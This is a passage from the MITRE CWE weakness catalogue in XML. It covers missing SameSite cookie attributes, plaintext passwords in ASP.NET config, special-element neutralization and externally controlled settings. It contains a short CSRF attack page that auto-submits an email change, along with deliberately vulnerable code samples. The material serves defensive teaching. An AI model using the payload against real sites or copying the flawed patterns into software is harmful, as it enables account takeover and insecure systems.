               <Body_Text>Since the sameSite attribute is not specified, the cookie will be sent to the website with each request made by the client. An attacker can potentially perform CSRF attack by using the following malicious page:</Body_Text>
               <Example_Code Nature="Attack" Language="HTML">
                  &lt;html&gt;<xhtml:br/>
		  <xhtml:div style="margin-left:1em;">
                    &lt;form id=evil action="http://local:3002/setEmail" method="POST"&gt;<xhtml:br/>
		    <xhtml:div style="margin-left:1em;">
		      &lt;input type="hidden" name="newEmail" value="abc@example.com" /&gt;<xhtml:br/>
		    </xhtml:div>
                    &lt;/form&gt;<xhtml:br/>
		  </xhtml:div>
                  &lt;script&gt;evil.submit()&lt;/script&gt;<xhtml:br/>
                  &lt;/html&gt;<xhtml:br/>
               </Example_Code>
               <Body_Text>When the client visits this malicious web page, it submits a '/setEmail' POST HTTP request to the vulnerable website. Since the browser automatically appends the 'sessionid' cookie to the request, the website automatically performs a 'setEmail' action on behalf of the client.</Body_Text>
               <Body_Text>To mitigate the risk, use the sameSite attribute of the 'sessionid' cookie set to 'Strict'.</Body_Text>
               <Example_Code Nature="Good" Language="JavaScript">
                 let sessionId = generateSessionId()<xhtml:br/>
                 let cookieOptions = { domain: 'example.com', sameSite: 'Strict' }<xhtml:br/>
                 response.cookie('sessionid', sessionId, cookieOptions)<xhtml:br/>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="62"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-1104"/>
            <Reference External_Reference_ID="REF-1105"/>
            <Reference External_Reference_ID="REF-1106"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>Michael Stepankin</Submission_Name>
               <Submission_Organization>Veracode</Submission_Organization>
               <Submission_Date>2020-06-19</Submission_Date>
            </Submission>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="13" Name="ASP.NET Misconfiguration: Password in Configuration File" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>Storing a plaintext password in a configuration file allows anyone who can read the file access to the password-protected resource making them an easy target for attackers.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="260" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Credentials stored in configuration files should be encrypted, Use standard APIs and industry accepted algorithms to encrypt the credentials stored in configuration files.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following example shows a portion of a configuration file for an ASP.Net application. This configuration file includes username and password information for a connection to a database, but the pair is stored in plaintext.</Intro_Text>
               <Example_Code Nature="Bad" Language="ASP.NET">
                  <xhtml:div>...<xhtml:br/>&lt;connectionStrings&gt;<xhtml:div style="margin-left:1em;">&lt;add name="ud_DEV" connectionString="connectDB=uDB; uid=db2admin; pwd=password; dbalias=uDB;" providerName="System.Data.Odbc" /&gt;</xhtml:div>&lt;/connectionStrings&gt;<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Username and password information should not be included in a configuration file or a properties file in plaintext as this will allow anyone who can read the file access to the resource. If possible, encrypt this information.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>ASP.NET Misconfiguration: Password in Configuration File</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-103"/>
            <Reference External_Reference_ID="REF-104"/>
            <Reference External_Reference_ID="REF-105"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated References, Demonstrative_Example, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="138" Name="Improper Neutralization of Special Elements" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as control elements or syntactic markers when they are sent to a downstream component.</Description>
         <Extended_Description>Most languages and protocols have their own special elements such as characters and reserved words. These special elements can carry control implications. If product does not prevent external control or influence over the inclusion of such special elements, the control flow of the program may be altered from what was intended. For example, both Unix and Windows interpret the symbol &lt; ("less than") as meaning "read input from a file".</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="707" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Other</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Alter Execution Logic</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Developers should anticipate that special elements (e.g. delimiters, symbols) will be injected into input vectors of their product. One defense is to create an allowlist (e.g. a regular expression) that defines valid input according to the requirements specifications. Strictly filter any input that does not match against the allowlist. Properly encode your output, and quote any elements that have special meaning to the component with which you are communicating.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>
                  <xhtml:p>Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.</xhtml:p>
                  <xhtml:p>When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."</xhtml:p>
                  <xhtml:p>Do not rely exclusively on looking for malicious or malformed inputs.  This is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, denylists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Use and specify an appropriate output encoding to ensure that the special elements are well-defined. A normal byte sequence in one encoding could be a special element in another.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-20">
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass allowlist validation schemes by introducing dangerous inputs after they have been checked.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict allowlist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88).</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2001-0677</Reference>
               <Description>Read arbitrary files from mail client by providing a special MIME header that is internally used to store pathnames for attachments.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2001-0677</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2000-0703</Reference>
               <Description>Setuid program does not cleanse special escape sequence before sending data to a mail program, causing the mail program to process those sequences.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2000-0703</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0020</Reference>
               <Description>Multi-channel issue. Terminal escape sequences not filtered from log files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0020</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0083</Reference>
               <Description>Multi-channel issue. Terminal escape sequences not filtered from log files.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0083</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Special Elements (Characters or Reserved Words)</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Custom Special Character Injection</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP24</Entry_ID>
               <Entry_Name>Tainted input to command</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="105"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="34"/>
         </Related_Attack_Patterns>
         <Notes>
            <Note Type="Relationship">This weakness can be related to interpretation conflicts or interaction errors in intermediaries (such as proxies or application firewalls) when the intermediary's model of an endpoint does not account for protocol-specific special elements.</Note>
            <Note Type="Relationship">See this entry's children for different types of special elements that have been observed at one point or another. However, it can be difficult to find suitable CVE examples. In an attempt to be complete, CWE includes some types that do not have any associated observed example.</Note>
            <Note Type="Research Gap">This weakness is probably under-studied for proprietary or custom formats. It is likely that these issues are fairly common in applications that use their own custom format for configuration files, logs, meta-data, messaging, etc. They would only be found by accident or with a focused effort based on an understanding of the format.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description, Observed_Examples, Other_Notes, Potential_Mitigations, Relationship_Notes, Relationships, Research_Gaps, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Special Elements (Characters or Reserved Words)</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-03-10">Failure to Sanitize Special Elements</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-04-05">Improper Sanitization of Special Elements</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="15" Name="External Control of System or Configuration Setting" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>One or more system settings or configuration elements can be externally controlled by a user.</Description>
         <Extended_Description>Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="642" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="610" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
         </Related_Weaknesses>
		 <Applicable_Platforms>
		   <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
		   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
		 </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>Setting manipulation vulnerabilities occur when an attacker can control values that govern the behavior of the system, manage specific resources, or in some way affect the functionality of the application.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Other</Scope>
               <Impact>Varies by Context</Impact>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-46">
               <Phase>Architecture and Design</Phase>
               <Strategy>Separation of Privilege</Strategy>
               <Description>
                  <xhtml:p>Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.</xhtml:p>
                  <xhtml:p>Ensure that appropriate compartmentalization is built into the system design, and the compartmentalization allows for and reinforces privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide the appropriate time to use privileges and the time to drop privileges.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>In general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following C code accepts a number as one of its command line parameters and sets it as the host ID of the current machine.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>...<xhtml:br/>sethostid(argv[1]);<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>Although a process must be privileged to successfully invoke sethostid(), unprivileged users may be able to invoke the program. The code in this example allows user input to directly control the value of a system setting. If an attacker provides a malicious value for host ID, the attacker can misidentify the affected machine on the network or cause other unintended behavior.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following Java code snippet reads a string from an HttpServletRequest and sets it as the active catalog for a database Connection.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>...<xhtml:br/>conn.setCatalog(request.getParameter("catalog"));<xhtml:br/>...</xhtml:div>
               </Example_Code>
               <Body_Text>In this example, an attacker could cause an error by providing a nonexistent catalog name or connect to an unauthorized portion of the database.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Setting Manipulation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="146"/>
            <Related_Attack_Pattern CAPEC_ID="176"/>
            <Related_Attack_Pattern CAPEC_ID="203"/>
            <Related_Attack_Pattern CAPEC_ID="270"/>
            <Related_Attack_Pattern CAPEC_ID="271"/>
            <Related_Attack_Pattern CAPEC_ID="579"/>
            <Related_Attack_Pattern CAPEC_ID="69"/>
            <Related_Attack_Pattern CAPEC_ID="76"/>
            <Related_Attack_Pattern CAPEC_ID="77"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Other_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Setting Manipulation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="183" Name="Permissive List of Allowed Inputs" Abstraction="Base" Structure="Simple" Status="Draft">
